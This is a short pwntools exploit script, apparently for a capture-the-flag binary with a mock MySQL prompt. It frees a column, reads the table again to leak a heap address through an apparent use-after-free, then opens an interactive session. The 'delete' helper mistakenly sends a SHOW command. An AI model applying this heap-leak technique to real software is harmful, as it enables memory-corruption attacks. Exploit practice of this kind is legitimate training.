from pwn import *
p=process('./pwn')

context.log_level='debug'
def create(name):
    p.sendlineafter(b'mysql > ',b'CREATE TABLE '+name)
def createcol(name1,name2):
    p.sendlineafter(b'mysql > ',b'CREATE '+name1+b' FROM '+name2)
def show(name):
    p.sendlineafter(b'mysql > ',b'SHOW TABLE '+name)
def delete(name):
    p.sendlineafter(b'mysql > ',b'SHOW TABLE '+name)
def deletecol(name1,name2):
    p.sendlineafter(b'mysql > ',b'DELETE '+name1+b' FROM '+name2)
create(b'qqq')
createcol(b'www',b'qqq')

show(b'qqq')
deletecol(b'www',b'qqq')
show(b'qqq')
createcol(b'www',b'qqq')

show(b'qqq')
# gdb.attach(p)
# pause()
p.recvuntil(b' Column Content: ')
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print('heap_addr',hex(heap_addr))

p.interactive()

# gzip < %s > %s.tmp && mv -f %s.tmp %s